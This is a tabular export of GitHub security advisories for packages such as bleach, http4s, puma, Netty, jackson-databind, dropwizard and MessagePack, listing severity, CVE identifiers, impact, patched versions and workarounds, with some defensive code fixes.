871,20045,bleach,GHSA-vqhp-cxgc-6wmm,CVE-2020-6817,https://github.com/advisories/GHSA-vqhp-cxgc-6wmm,high,2020-03-30 19:45:56 UTC,regular expression denial-of-service (ReDoS) in Bleach,"### Impact

`bleach.clean` behavior parsing style attributes could result in a regular expression denial of service (ReDoS).

Calls to ``bleach.clean`` with an allowed tag with an allowed ``style`` attribute are vulnerable to ReDoS. For example, ``bleach.clean(..., attributes={'a': ['style']})``.

### Patches

3.1.4

### Workarounds

* do not whitelist the style attribute in `bleach.clean` calls

* limit input string length

### References

* https://bugzilla.mozilla.org/show_bug.cgi?id=1623633
* https://www.regular-expressions.info/redos.html
* https://blog.r2c.dev/posts/finding-python-redos-bugs-at-scale-using-dlint-and-r2c/
* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-6817

### Credits

* Reported by schwag09 of r2c

### For more information
If you have any questions or comments about this advisory:

* Open an issue at https://github.com/mozilla/bleach/issues
* Email us at security@mozilla.org",pip
872,30443,vyper,GHSA-mr6r-mvw4-736g,,https://github.com/advisories/GHSA-mr6r-mvw4-736g,low,2020-03-25 18:20:19 UTC,Vyper interfaces returning integer types less than 256 bits can be manipulated if uint256 is used,"# VVE-2020-0001

Earlier today, we received a responsible disclosure of a potential issue from @montyly (security researcher at @trailofbits) for Vyper users who make assumptions about what values certain interface types can return.

### Impact
We determined the issue to be mild and unlikely to be exploited, with an easy workaround while the correct resolution is in process. The issue stems from a number of things, which we will detail here.

(1) The ABI Specification is under-defined such that function return type is not always reflected in how you use it

This means that a function which returns `uint8` under the hood actually returns a 32 byte integer, making it identical to a function that returns `uint256`. This allows users to read an interface that returns a `uint8` value to be stored into a `uint256` variable without any explicit casting or input validation.

(2) Vyper doesn&#39;t have `uint8` types

When Vyper was originally created, it only had one numeric type, but we added just enough types to be able to work with the majority of ERC interfaces that exist.

Unfortunately, we never added `uint8`, because it&#39;s only majority usage was for `ERC20.decimals()` as the return type, which isn&#39;t reflected in the method ID. Because of (1), it didn&#39;t matter that we didn&#39;t have these types implemented because you could capture the return value as `uint256` and use it just fine.

(3) `ERC20.decimals()` returns `uint8`

`ERC20.decimal()` (which is an optional function) returns a `uint8` type. While it was never intentioned to be used directly within a smart contract (hence being optional), someone could easily make the decision to rely on it to perform important functionality within their Vyper smart contract. This might lead to a scenario where an unexpectedly large value (&gt; 255) returned by calling this function (which a malicious contract writer might write) would allow an attacker to manipulate or bypass certain logic depending on this value.

In summary, because of (1), it isn&#39;t necessary to have to cast the return value of a function that returns `uint8` to `uint256`, and because of (2) it isn&#39;t possible to have the type system protect against this type of error. This could lead to scenarios like (3) where this behavior can be exploited.

### Patches
We are currently refactoring our typing system so we can implement all ABI-compliant integer types, but no currently patched version is available that gives users access to the `uint8` type.

### Workarounds
There is an easy workaround where you should check that the value returned by an interface which specifies `uint8` should be checked to be within the bounds of a `uint8` integer. As an example:

```python
...
# returns uint8, but we implicitly cast to uint256 without checking
decimals: uint256 = ERC20(_token).decimal()
# FIX: Insert this line
assert decimals &lt; 256
...
```

Depending on how you use this value, it may not be necessary to insert this check.

### References
* [ABI Specification](https://solidity.readthedocs.io/en/latest/abi-spec.html)

### For more information
If you have any questions or comments about this advisory:
* Chat with us in [our gitter ](https://gitter.im/vyperlang/community)
* Open an issue in [https://github.com/vyperlang/vyper](https://github.com/vyperlang/vyper)
* Email us at [security@vyperlang.org](mailto:security@vyperlang.org)",pip
873,38033,org.http4s:http4s-server_2.12,GHSA-66q9-f7ff-mmx6,CVE-2020-5280,https://github.com/advisories/GHSA-66q9-f7ff-mmx6,critical,2020-03-25 17:35:51 UTC,Local file inclusion vulnerability in http4s,"### Impact

This vulnerability applies to all users of:
* `org.http4s.server.staticcontent.FileService`
* `org.http4s.server.staticcontent.ResourceService`
* `org.http4s.server.staticcontent.WebjarService`

#### Path escaping

URI normalization is applied incorrectly.  Requests whose path info contain `../` or `//` can expose resources outside of the configured location.  Specifically:

* `FileService` may expose any file on the local file system.
* `ResourceService` may expose any resource on the class path.

#### Prefix matching

When the service is configured with a non-empty `pathPrefix` that doesn't end in a slash, any directories whose names are a prefix of `systemPath` (from `FileService`) or `pathPrefix` (from `ResourceService`) are exposed.  For example, if `pathPrefix` is `/foo` and `systemPath` is `/bar`, a request to `/foobaz/quux.txt` exposes file `/barbaz/quux.txt`, when only files beneath `/bar` should be available.

#### URI decoding

URI segments are not decoded before resource resolution.  This causes resources with reserved characters in their name to incorrectly return a 404.  It also may incorrectly expose the rare resource whose name is URI encoded.  This applies to `FileService`, `ResourceService`, and `WebjarService`.

### Patches

In all three services, paths with an empty segment, a `.` segment, or a `..` segment are now rejected with a `400 Bad Request` response.  This fixes exposure outside the configured root.  Many clients already eliminate dot segments according to the rules in [RFC3986, Section 5.2.4](https://tools.ietf.org/html/rfc3986#section-5.2.4).  A middleware that does so at the server level may be considered if there is demand.

If `pathInfo` is non-empty, and does not begin with `/`, then a 404 response is generated.  This fixes the prefix matching exposure.

All path segments are URI decoded before being passed to the file system or resource path.  This allows resolution of resources with reserved characters in the name, and prevents incorrect exposure of resources whose names are themselves URI encoded.

### Workarounds

The recommended course is to upgrade:
* v0.18.26, binary compatible with the 0.18.x series
* v0.20.20, binary compatible with the 0.20.x series
* v0.21.2, binary compatible with the 0.21.x series

Note that 0.19.0 is a deprecated release and has never been supported.

If an upgrade is impossible:

* Temporarily copy `FileService.scala`, `ResourceService.scala`, and `WebjarService.scala` from the appropriate release series into your project and recompile with that, changing the package name and reference in your application.
* Users of a servlet backend can use the servlet container's file serving capabilities.

### Credits

Thank you to Thomas Gøytil for the discovery, responsible disclosure, and assistance testing of this vulnerability.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [http4s/http4s](http://github.com/http4s/http4s)
* Email a maintainer:
  * [Ross A. Baker](mailto:ross@rossabaker.com)",maven
874,20045,bleach,GHSA-m6xf-fq7q-8743,CVE-2020-6816,https://github.com/advisories/GHSA-m6xf-fq7q-8743,moderate,2020-03-24 15:06:32 UTC,mutation XSS via whitelisted math or svg and raw tag in Bleach,"### Impact

A [mutation XSS](https://cure53.de/fp170.pdf) affects users calling `bleach.clean` with all of:

* the `svg` or `math` in the allowed/whitelisted tags
* an RCDATA tag (see below) in the allowed/whitelisted tags
* the keyword argument `strip=False`

### Patches

Users are encouraged to upgrade to bleach v3.1.2 or greater.

### Workarounds

* modify `bleach.clean` calls to use `strip=True`, or not whitelist `math` or `svg` tags and one or more of the following tags:

```
script
noscript
style
noframes
xmp
noembed
iframe
```

* A strong [Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) without `unsafe-inline` and `unsafe-eval` [`script-src`s](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src)) will also help mitigate the risk.

### References

* https://bugzilla.mozilla.org/show_bug.cgi?id=1621692
* https://cure53.de/fp170.pdf
* https://nvd.nist.gov/vuln/detail/CVE-2020-6816
* https://www.checkmarx.com/blog/vulnerabilities-discovered-in-mozilla-bleach

### Credits

* Reported by [Yaniv Nizry](https://twitter.com/ynizry) from the CxSCA AppSec group at Checkmarx

### For more information

If you have any questions or comments about this advisory:

* Open an issue at [https://github.com/mozilla/bleach/issues](https://github.com/mozilla/bleach/issues)
* Email us at [security@mozilla.org](mailto:security@mozilla.org)",pip
875,30264,easybuild-framework,GHSA-2wx6-wc87-rmjm,CVE-2020-5262,https://github.com/advisories/GHSA-2wx6-wc87-rmjm,moderate,2020-03-19 17:29:58 UTC,GitHub personal access token leaking into temporary EasyBuild (debug) logs,"### Impact

The GitHub Personal Access Token (PAT) used by EasyBuild for the GitHub integration features (like `--new-pr`, `--from-pr`, etc.) is shown in plain text in EasyBuild debug log files.

Scope:

* the log message only appears in the top-level log file, *not* in the individual software installation logs (see https://easybuild.readthedocs.io/en/latest/Logfiles.html);
    - as a consequence, tokens are *not* included in the partial log files that are uploaded into a gist when using `--upload-test-report` in combination with `--from-pr`, nor in the installation logs that are copied to the software installation directories;
* the message is only logged when using `--debug`, so it will not appear when using the default EasyBuild configuration (only info messages are logged by default);
* the log message is triggered via `--from-pr`, but also via various other GitHub integration options like `--new-pr`, `--merge-pr`, `--close-pr`, etc., but usually only appears in the temporary log file that is cleaned up automatically as soon as eb completes successfully;
* you may have several debug log files that include your GitHub token in `/tmp` (or a different location if you've set the `--tmpdir` EasyBuild configuration option) on the systems where you use EasyBuild, but they are located in a subdirectory that is only accessible to your account (permissions set to 700);
* the only way that a log file that may include your token could have been made public is *if you shared it yourself*, for example by copying the contents of the log file into a gist manually, or by sending a log file to someone;
* for log files uploaded to GitHub, your token would be revoked automatically when GitHub notices it;

### Patches

The issue is fixed with the changes in https://github.com/easybuilders/easybuild-framework/pull/3248.

This fix is included in EasyBuild v4.1.2 (released on Mon Mar 16th 2020), and in the `master`+  `develop` branches of the `easybuild-framework` repository since Mon Mar 16th 2020 (see https://github.com/easybuilders/easybuild-framework/pull/3248 and https://github.com/easybuilders/easybuild-framework/pull/3249 resp.).

**Make sure you revoke the existing GitHub tokens you're using with EasyBuild** (via https://github.com/settings/tokens), and install new ones using ""`eb --install-github-token --force`"" (see also https://easybuild.readthedocs.io/en/latest/Integration_with_GitHub.html#installing-a-github-token-install-github-token).

### Workarounds

* avoid using the GitHub integration features (see https://easybuild.readthedocs.io/en/latest/Integration_with_GitHub.html) with EasyBuild versions older than version 4.1.2;
* don't share top-level EasyBuild (debug) log files with others, unless you are sure your GitHub token is not included in them;
* clean up temporary EasyBuild log files in `/tmp`on the system(s) where you`re using EasyBuild

### References

* https://github.com/easybuilders/easybuild-framework/pull/3248 (PR that fixes the issue)
* (release announcement to EasyBuild mailing list)

### For more information

* Open an issue in [the `easybuild-framework` repository](https://github.com/easybuilders/easybuild-framework)
* Email us at [easybuild-admin@lists.ugent.be](mailto:easybuild-admin@lists.ugent.be)",pip
876,19542,administrate,GHSA-2p5p-m353-833w,CVE-2020-5257,https://github.com/advisories/GHSA-2p5p-m353-833w,high,2020-03-13 21:05:44 UTC,Sort order SQL injection in Administrate,"In Administrate (rubygem) before version 0.13.0, when sorting by attributes on a dashboard,
the direction parameter was not validated before being interpolated into the SQL query.
This could present a SQL injection if the attacker were able to modify the `direction` parameter and bypass ActiveRecord SQL protections.

Whilst this does have a high-impact, to exploit this you need access to the Administrate dashboards, which we would expect to be behind authentication.

This is patched in wersion 0.13.0.",rubygems
877,20253,python-gnupg,GHSA-qh62-ch95-63wh,,https://github.com/advisories/GHSA-qh62-ch95-63wh,moderate,2020-03-13 20:05:10 UTC,python-gnupg allows context-dependent attackers to trick gnupg to decrypt other ciphertext than intended,**Withdrawn:** Duplicate of GHSA-2fch-jvg5-crf6,pip
878,19874,docutils,GHSA-cg75-6938-wx58,CVE-2009-5042,https://github.com/advisories/GHSA-cg75-6938-wx58,critical,2020-03-13 20:04:51 UTC,python-docutils allows insecure usage of temporary files,python-docutils allows insecure usage of temporary files,pip
879,19851,psutil,GHSA-qfc5-mcwq-26q8,CVE-2019-18874,https://github.com/advisories/GHSA-qfc5-mcwq-26q8,high,2020-03-12 17:02:50 UTC,Double Free in psutil,psutil (aka python-psutil) through 5.6.5 can have a double free. This occurs because of refcount mishandling within a while or for loop that converts system data into a Python object.,pip
880,19953,keyring,GHSA-p86x-652p-6385,CVE-2012-5577,https://github.com/advisories/GHSA-p86x-652p-6385,high,2020-03-11 21:36:38 UTC,Incorrect Default Permissions in keyring,Python keyring lib before 0.10 created keyring files with world-readable permissions.,pip
881,30184,rply,GHSA-m8qc-mf6p-pfq9,CVE-2014-1938,https://github.com/advisories/GHSA-m8qc-mf6p-pfq9,moderate,2020-03-11 20:56:34 UTC,Link Following in rply,python-rply before 0.7.4 insecurely creates temporary files.,pip
882,19953,keyring,GHSA-8867-vpm3-g98g,CVE-2012-5578,https://github.com/advisories/GHSA-8867-vpm3-g98g,moderate,2020-03-10 20:56:41 UTC,Incorrect Default Permissions in keyring,Python keyring has insecure permissions on new databases allowing world-readable files to be created,pip
883,20002,python-keystoneclient,GHSA-9vg3-cf92-h2h7,CVE-2013-2167,https://github.com/advisories/GHSA-9vg3-cf92-h2h7,critical,2020-03-10 20:39:05 UTC,Insufficient Verification of Data Authenticity in python-keystoneclient,python-keystoneclient version 0.2.3 to 0.2.5 has middleware memcache signing bypass,pip
884,27922,user_agent_parser,GHSA-pcqq-5962-hvcw,,https://github.com/advisories/GHSA-pcqq-5962-hvcw,high,2020-03-10 18:02:49 UTC,Denial of Service in uap-core when processing crafted User-Agent strings,"### Impact
Some regexes are vulnerable to regular expression denial of service (REDoS) due to overlapping capture groups. This allows remote attackers to overload a server by setting the User-Agent header in an HTTP(S) request to maliciously crafted long strings.

### Patches
Please update `uap-ruby` to &gt;= v2.6.0

### For more information
https://github.com/ua-parser/uap-core/security/advisories/GHSA-cmcx-xhr8-3w9p

Reported in `uap-core` by Ben Caller @bcaller",rubygems
885,20678,requests-kerberos,GHSA-wh37-37xw-54hr,CVE-2014-8650,https://github.com/advisories/GHSA-wh37-37xw-54hr,critical,2020-03-10 18:02:31 UTC,Improper Authentication in requests-kerberos,python-requests-Kerberos through 0.5 does not handle mutual authentication,pip
886,18987,puma,GHSA-84j7-475p-hp8v,CVE-2020-5247,https://github.com/advisories/GHSA-84j7-475p-hp8v,moderate,2020-02-28 16:53:55 UTC,HTTP Response Splitting in Puma,"In Puma (RubyGem) before 4.3.2 and 3.12.3, if an application using Puma allows untrusted input in a response header,
an attacker can use newline characters (i.e. `CR`, `LF` or`/r`, `/n`) to end the header and inject malicious content, 
such as additional headers or an entirely new response body. This vulnerability is known as HTTP Response Splitting.

While not an attack in itself, response splitting is a vector for several other attacks, such as cross-site scripting (XSS).

This is related to CVE-2019-16254, which fixed this vulnerability for the WEBrick Ruby web server.

This has been fixed in versions 4.3.2 and 3.12.3 by checking all headers for line endings and rejecting headers with those characters.  ",rubygems
887,18987,puma,GHSA-33vf-4xgg-9r58,CVE-2020-5249,https://github.com/advisories/GHSA-33vf-4xgg-9r58,moderate,2020-03-03 23:33:16 UTC,HTTP Response Splitting (Early Hints) in Puma,"### Impact
If an application using Puma allows untrusted input in an early-hints header, an attacker can use a carriage return character to end the header and inject malicious content, such as additional headers or an entirely new response body. This vulnerability is known as [HTTP Response Splitting](https://owasp.org/www-community/attacks/HTTP_Response_Splitting)

While not an attack in itself, response splitting is a vector for several other attacks, such as cross-site scripting (XSS).

This is related to [CVE-2020-5247](https://github.com/puma/puma/security/advisories/GHSA-84j7-475p-hp8v), which fixed this vulnerability but only for regular responses.

### Patches
This has been fixed in 4.3.3 and 3.12.4.

### Workarounds
Users can not allow untrusted/user input in the Early Hints response header.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [puma](https://github.com/puma/puma)
* Email us a project maintainer. [Email addresses are listed in our Code of Conduct](https://github.com/puma/puma/blob/master/CODE_OF_CONDUCT.md#enforcement).",rubygems
888,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-4w82-r329-3q67,CVE-2020-8840,https://github.com/advisories/GHSA-4w82-r329-3q67,critical,2020-03-04 20:52:14 UTC,Deserialization of Untrusted Data in jackson-databind,"FasterXML jackson-databind 2.x before 2.6.7.4, 2.7.x before 2.7.9.7, 2.8.x before 2.8.11.5 and 2.9.x before 2.9.10.2  lacks certain xbean-reflect/JNDI blocking, as demonstrated by org.apache.xbean.propertyeditor.JndiConverter.",maven
889,34320,org.apache.tomcat.embed:tomcat-embed-core,GHSA-767j-jfh2-jvrc,CVE-2019-17569,https://github.com/advisories/GHSA-767j-jfh2-jvrc,moderate,2020-02-28 01:10:58 UTC,Potential HTTP request smuggling in Apache Tomcat,"The refactoring present in Apache Tomcat versions 9.0.28 to 9.0.30, 8.5.48 to 8.5.50 and 7.0.98 to 7.0.99 introduced a regression. The result of the regression was that invalid Transfer-Encoding headers were incorrectly processed leading to a possibility of HTTP Request Smuggling if Tomcat was located behind a reverse proxy that incorrectly handled the invalid Transfer-Encoding header in a particular manner. Such a reverse proxy is considered unlikely.",maven
890,34320,org.apache.tomcat.embed:tomcat-embed-core,GHSA-qxf4-chvg-4r8r,CVE-2020-1935,https://github.com/advisories/GHSA-qxf4-chvg-4r8r,moderate,2020-02-28 01:10:48 UTC,Potential HTTP request smuggling in Apache Tomcat,"In Apache Tomcat 9.0.0.M1 to 9.0.30, 8.5.0 to 8.5.50 and 7.0.0 to 7.0.99 the HTTP header parsing code used an approach to end-of-line parsing that allowed some invalid HTTP headers to be parsed as valid. This led to a possibility of HTTP Request Smuggling if Tomcat was located behind a reverse proxy that incorrectly handled the invalid Transfer-Encoding header in a particular manner. Such a reverse proxy is considered unlikely.",maven
891,18812,rake,GHSA-jppv-gw3r-w3q8,CVE-2020-8130,https://github.com/advisories/GHSA-jppv-gw3r-w3q8,moderate,2020-02-28 16:54:36 UTC,OS Command Injection in Rake,There is an OS command injection vulnerability in Ruby Rake before 12.3.3 in Rake::FileList when supplying a filename that begins with the pipe character `|`.,rubygems
892,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-gww7-p5w4-wrfv,CVE-2019-20330,https://github.com/advisories/GHSA-gww7-p5w4-wrfv,critical,2020-03-04 20:52:11 UTC,Deserialization of Untrusted Data in jackson-databind,"FasterXML jackson-databind 2.x before 2.6.7.4, 2.7.x before 2.7.9.7, 2.8.x before 2.8.11.5 and 2.9.x before 2.9.10.2 lacks certain net.sf.ehcache blocking.",maven
893,20092,ansible,GHSA-3m93-m4q6-mc6v,CVE-2019-14864,https://github.com/advisories/GHSA-3m93-m4q6-mc6v,moderate,2020-02-26 19:54:31 UTC,Inclusion of Sensitive Information in Log Files and Improper Output Neutralization for Logs in Ansible,"Ansible, versions 2.9.x before 2.9.1, 2.8.x before 2.8.7 and Ansible versions 2.7.x before 2.7.15, is not respecting the flag no_log set it to True when Sumologic and Splunk callback plugins are used send tasks results events to collectors. This would discloses and collects any sensitive data.",pip
894,38556,io.dropwizard:dropwizard-validation,GHSA-3mcp-9wr4-cjqf,CVE-2020-5245,https://github.com/advisories/GHSA-3mcp-9wr4-cjqf,high,2020-02-24 17:27:27 UTC,Remote Code Execution (RCE) vulnerability in dropwizard-validation,"Dropwizard-Validation before 1.3.19, and 2.0.2 may allow arbitrary code execution on the host system, with the privileges of the Dropwizard service account, by injecting arbitrary Java Expression Language expressions when using the self-validating feature.

### Summary

A server-side template injection was identified in the self-validating ([`@SelfValidating`](https://javadoc.io/static/io.dropwizard/dropwizard-project/2.0.2/io/dropwizard/validation/selfvalidating/SelfValidating.html)) feature of **dropwizard-validation** enabling attackers to inject arbitrary Java EL expressions, leading to Remote Code Execution (RCE) vulnerability.

If you're using a self-validating bean (via [`@SelfValidating`](https://javadoc.io/static/io.dropwizard/dropwizard-project/2.0.2/io/dropwizard/validation/selfvalidating/SelfValidating.html)), an upgrade to Dropwizard 1.3.19 or 2.0.2 is strongly recommended.

### Impact

This issue may allow Remote Code Execution (RCE), allowing to run arbitrary code on the host system (with the privileges of the Dropwizard service account privileges) by injecting arbitrary [Java Expression Language (EL)](https://docs.jboss.org/hibernate/validator/6.1/reference/en-US/html_single/#section-interpolation-with-message-expressions) expressions when using the self-validating feature ([`@SelfValidating`](https://javadoc.io/static/io.dropwizard/dropwizard-project/2.0.2/io/dropwizard/validation/selfvalidating/SelfValidating.html), [`@SelfValidation`](https://javadoc.io/static/io.dropwizard/dropwizard-project/2.0.2/io/dropwizard/validation/selfvalidating/SelfValidation.html)) in **dropwizard-validation**.

### Patches

The issue has been fixed in **dropwizard-validation** **1.3.19** and **2.0.2**. We strongly recommend upgrading to one of these versions.

### Workarounds

If you are not able to upgrade to one of the aforementioned versions of **dropwizard-validation** but still want to use the [`@SelfValidating`](https://javadoc.io/static/io.dropwizard/dropwizard-project/2.0.2/io/dropwizard/validation/selfvalidating/SelfValidating.html) feature, make sure to properly sanitize any message you're adding to the [`ViolationCollector`](https://javadoc.io/static/io.dropwizard/dropwizard-project/2.0.2/io/dropwizard/validation/selfvalidating/ViolationCollector.html) in the method annotated with [`@SelfValidation`](https://javadoc.io/static/io.dropwizard/dropwizard-project/2.0.2/io/dropwizard/validation/selfvalidating/SelfValidation.html).

Example:
```java
@SelfValidation
public void validateFullName(ViolationCollector col) {
    if (fullName.contains(""_"")) {
        // Sanitize fullName variable by escaping relevant characters such as ""$""
        col.addViolation(""Full name contains invalid characters:  "" + sanitizeJavaEl(fullName));
    }
}
```

See also:
https://github.com/dropwizard/dropwizard/blob/v2.0.2/dropwizard-validation/src/main/java/io/dropwizard/validation/selfvalidating/ViolationCollector.java#L84-L98

### References

* https://github.com/dropwizard/dropwizard/pull/3157
* https://github.com/dropwizard/dropwizard/pull/3160
* https://docs.oracle.com/javaee/7/tutorial/jsf-el.htm
* https://docs.jboss.org/hibernate/validator/6.1/reference/en-US/html_single/#section-interpolation-with-message-expressions
* https://beanvalidation.org/2.0/spec/#validationapi-message-defaultmessageinterpolation

### For more information

If you have any questions or comments about this advisory:
* Open an issue in [dropwizard/dropwizard](https://github.com/dropwizard/dropwizard/issues/new)
* Start a discussion on the [dropwizard-dev mailing list](https://groups.google.com/forum/#!forum/dropwizard-dev)

### Security contact

If you want to responsibly disclose a security issue in Dropwizard or one of its official modules, please contact us via the published channels in our [security policy](https://github.com/dropwizard/dropwizard/security/policy):

https://github.com/dropwizard/dropwizard/security/policy#reporting-a-vulnerability",maven
895,13089,MessagePack,GHSA-7q36-4xx7-xcxf,CVE-2020-5234,https://github.com/advisories/GHSA-7q36-4xx7-xcxf,moderate,2020-01-31 17:59:20 UTC,Untrusted data can lead to DoS attack due to hash collisions and stack overflow in MessagePack,"### Impact

When this library is used to deserialize messagepack data from an untrusted source, there is a risk of a denial of service attack by either of two vectors:

1. hash collisions - leading to large CPU consumption disproportionate to the size of the data being deserialized.
1. stack overflow - leading to the deserializing process crashing.

### Patches

The following steps are required to mitigate this risk.

1. Upgrade to a version of the library where a fix is available
1. Add code to your application to put MessagePack into the defensive `UntrustedData` mode.
1. Identify all MessagePack extensions that implement `IMessagePackFormatter&lt;T&gt;` implementations that do not ship with the MessagePack library to include the security mitigations. This includes those acquired from 3rd party packages and classes included directly into your project. Any AOT formatters generated with the MPC tool must be regenerated with the patched version of mpc.
1. Review your messagepack-serializable data structures for hash-based collections that use custom or unusual types for the hashed key. See below for details on handling such situations.

Review the `MessagePackSecurity` class to tweak any settings as necessary to strike the right balance between performance, functionality, and security.

Specialized `IEqualityComparer&lt;T&gt;` implementations provide the hash collision resistance.
Each type of hashed key may require a specialized implementation of its own.
The patched MessagePack library includes many such implementations for primitive types commonly used as keys in hash-based collections.
If your data structures use custom types as keys in these hash-based collections,
putting MessagePack in `UntrustedData` mode may lead the deserializer to throw an exception
because no safe `IEqualityComparer&lt;T&gt;` is available for your custom `T` type.
You can provide your own safe implementation by deriving from the `MessagePackSecurity` class
and overriding the `GetHashCollisionResistantEqualityComparer&lt;T&gt;()` method to return your own
custom implementation when `T` matches your type, and fallback to `return base.GetHashCollisionResistantEqualityComparer&lt;T&gt;();` for types you do not have custom implementations for.

Unrelated to this advisory, but as general security guidance, you should also avoid the Typeless serializer/formatters/resolvers for untrusted data as that opens the door for the untrusted data to potentially deserialize unanticipated types that can compromise security.

#### MessagePack 1.x users

1. Upgrade to any 1.9.x version.

1. When deserializing untrusted data, put MessagePack into a more secure mode with:

    ```cs
    MessagePackSecurity.Active = MessagePackSecurity.UntrustedData;
    ```

    In MessagePack v1.x this is a static property and thus the security level is shared by the entire process or AppDomain.
    Use MessagePack v2.1 or later for better control over the security level for your particular use.

1. Any code produced by mpc should be regenerated with the mpc tool with the matching (patched) version. Such generated code usually is written to a file called `Generated.cs`. A patched `Generated.cs` file will typically reference the `MessagePackSecurity` class.

    Review any custom-written `IMessagePackFormatter&lt;T&gt;` implementations in your project or that you might use from 3rd party packages to ensure they also utilize the `MessagePackSecurity` class as required.
    In particular, a formatter that deserializes an object (as opposed to a primitive value) should wrap the deserialization in a `using (MessagePackSecurity.DepthStep())` block. For example:

    ```cs
    public MyObject Deserialize(ref MessagePackReader reader, MessagePackSerializerOptions options)
    {
        if (reader.TryReadNil())
        {
            return default;
        }
        else
        {
            using (MessagePackSecurity.DepthStep()) // STACK OVERFLOW MITIGATION
            {
                MyObject o = new MyObject();
                // deserialize members of the object here.
                return o;
            }
        }
    }
    ```

    If your custom formatter creates hash-based collections (e.g. `Dictionary&lt;K, V&gt;` or `HashSet&lt;T&gt;`) where the hashed key comes from the messagepack data, always instantiate your collection using `MessagePackSecurity.Active.GetEqualityComparer&lt;T&gt;()` as the equality comparer:

    ```cs
    var collection = new HashSet&lt;T&gt;(MessagePackSecurity.Active.GetEqualityComparer&lt;T&gt;());
    ```

    This ensures that when reading untrusted data, you will be using a collision-resistent hash algorithm.

Learn more about [best security practices when reading untrusted data with MessagePack 1.x](https://github.com/neuecc/MessagePack-CSharp/tree/v1.x#security).

#### MessagePack 2.x users

1. Upgrade to any 2.1.x or later version.

1. When deserializing untrusted data, put MessagePack into a more secure mode by configuring your `MessagePackSerializerOptions.Security` property:

    ```cs
    var options = MessagePackSerializerOptions.Standard
        .WithSecurity(MessagePackSecurity.UntrustedData);

    // Pass the options explicitly for the greatest control.
    T object = MessagePackSerializer.Deserialize&lt;T&gt;(data, options);

    // Or set the security level as the default.
    MessagePackSerializer.DefaultOptions = options;
    ```

1. Any code produced by mpc should be regenerated with the mpc tool with the matching (patched) version. Such generated code usually is written to a file called `Generated.cs`. A patched `Generated.cs` file will typically reference the `Security` member on the `MessagePackSerializerOptions` parameter.

    Review any custom-written `IMessagePackFormatter&lt;T&gt;` implementations in your project or that you might use from 3rd party packages to ensure they also utilize the `MessagePackSecurity` class as required.
    In particular, a formatter that deserializes an object (as opposed to a primitive value) should call `options.Security.DepthStep(ref reader);` before deserializing the object&#39;s members, and be sure to revert the depth step with `reader.Depth--;` before exiting the method. For example:

    ```cs
    public MyObject Deserialize(ref MessagePackReader reader, MessagePackSerializerOptions options)
    {
        if (reader.TryReadNil())
        {
            return default;
        }
        else
        {
            options.Security.DepthStep(ref reader); // STACK OVERFLOW MITIGATION, line 1
            try
            {
                MyObject o = new MyObject();
                // deserialize members of the object here.
                return o;
            }
            finally
            {
                reader.Depth--; // STACK OVERFLOW MITIGATION, line 2
            }
        }
    }
    ```

    If your custom formatter creates hash-based collections (e.g. `Dictionary&lt;K, V&gt;` or `HashSet&lt;T&gt;`) where the hashed key comes from the messagepack data, always instantiate your collection using `options.Security.GetEqualityComparer&lt;TKey&gt;()` as the equality comparer:

    ```cs
    var collection = new HashSet&lt;T&gt;(options.Security.GetEqualityComparer&lt;T&gt;());
    ```

    This ensures that when reading untrusted data, you will be using a collision-resistent hash algorithm.

Learn more about [best security practices when reading untrusted data with MessagePack 2.x](https://github.com/neuecc/MessagePack-CSharp#security).

### Workarounds

The security vulnerabilities are in the formatters.
Avoiding the built-in formatters entirely in favor of reading messagepack primitive data directly
or relying on carefully written custom formatters can provide a workaround.

MessagePack v1.x users may utilize the `MessagePackBinary` static class directly to read the data they expect.
MessagePack v2.x users may utilize the `MessagePackReader` struct directly to read the data they expect.

### References

Learn more about best security practices when reading untrusted data with [MessagePack 1.x](https://github.com/neuecc/MessagePack-CSharp/tree/v1.x#security) or [MessagePack 2.x](https://github.com/neuecc/MessagePack-CSharp#security).

### For more information

If you have any questions or comments about this advisory:

* Open an issue in [MessagePack-CSharp](https://github.com/neuecc/MessagePack-CSharp/issues/new/choose)
* [Email us](mailto:andrewarnott@gmail.com)",nuget
896,34137,io.netty:netty-handler,GHSA-ff2w-cq2g-wv5f,CVE-2020-7238,https://github.com/advisories/GHSA-ff2w-cq2g-wv5f,high,2020-02-21 18:55:50 UTC,HTTP Request Smuggling in Netty,Netty 4.1.43.Final allows HTTP Request Smuggling because it mishandles Transfer-Encoding whitespace (such as a [space]Transfer-Encoding:chunked line) and a later Content-Length header. This issue exists because of an incomplete fix for CVE-2019-16869.,maven
897,34137,io.netty:netty-handler,GHSA-cqqj-4p63-rrmm,CVE-2019-20444,https://github.com/advisories/GHSA-cqqj-4p63-rrmm,critical,2020-02-21 18:55:24 UTC,HTTP Request Smuggling in Netty,"HttpObjectDecoder.java in Netty before 4.1.44 allows an HTTP header that lacks a colon, which might be interpreted as a separate header with an incorrect syntax, or might be interpreted as an ""invalid fold.""",maven
898,34137,io.netty:netty-handler,GHSA-p2v9-g2qv-p635,CVE-2019-20445,https://github.com/advisories/GHSA-p2v9-g2qv-p635,moderate,2020-02-21 18:55:04 UTC,HTTP Request Smuggling in Netty,"HttpObjectDecoder.java in Netty before 4.1.44 allows a Content-Length header to be accompanied by a second Content-Length header, or by a Transfer-Encoding header.",maven
899,20045,bleach,GHSA-q65m-pv3f-wr5r,CVE-2020-6802,https://github.com/advisories/GHSA-q65m-pv3f-wr5r,moderate,2020-02-24 17:33:44 UTC,XSS in Bleach when noscript and raw tag whitelisted,"### Impact

A [mutation XSS](https://cure53.de/fp170.pdf) affects users calling `bleach.clean` with `noscript` and a raw tag (see below) in the allowed/whitelisted tags option.

### Patches

v3.1.1

### Workarounds

* modify `bleach.clean` calls to not whitelist `noscript` and one or more of the following raw tags:

```
title
textarea
script
style
noembed
noframes
iframe
xmp
```

* A strong [Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) without `unsafe-inline` and `unsafe-eval` [`script-src`s](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src)) will also help mitigate the risk.

### References

* https://bugzilla.mozilla.org/show_bug.cgi?id=1615315
* https://cure53.de/fp170.pdf
* https://nvd.nist.gov/vuln/detail/CVE-2020-6802
* https://www.checkmarx.com/blog/vulnerabilities-discovered-in-mozilla-bleach

### Credits

